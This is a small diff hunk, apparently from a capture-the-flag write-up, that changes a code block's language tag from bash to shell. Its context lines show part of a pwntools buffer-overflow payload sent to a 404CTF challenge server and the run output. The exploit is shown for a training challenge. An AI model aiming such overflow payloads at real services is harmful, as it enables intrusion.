@@ -38,7 +38,7 @@ p.sendline(b'A'*16+p32(0x50bada55)+b'AAA')
 print(p.recvall().decode())
 ```
 
-```bash
+```shell
 $ python3 exploit.py 
 [+] Opening connection to challenges.404ctf.fr on port 30274: Done
 [+] Receiving all data: Done (119B)
